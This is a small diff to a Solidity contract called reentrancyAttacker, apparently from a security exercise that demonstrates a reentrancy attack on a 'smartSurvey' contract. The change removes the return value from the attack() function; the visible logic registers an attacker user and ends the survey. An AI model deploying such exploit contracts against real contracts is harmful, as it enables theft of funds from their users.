@@ -12,7 +12,7 @@ contract reentrancyAttacker {
         surveyName = _surveyName;
     }
 
-    function attack() external payable returns (uint256){
+    function attack() external payable {
         //register the attacker
         smartSurvey.registerUser("attacker", 1111);
         
@@ -25,7 +25,7 @@ contract reentrancyAttacker {
 
         //end it
         smartSurvey.endNow(surveyName);
-        return address(this).balance;
+        //return address(this).balance;
        
 
     }
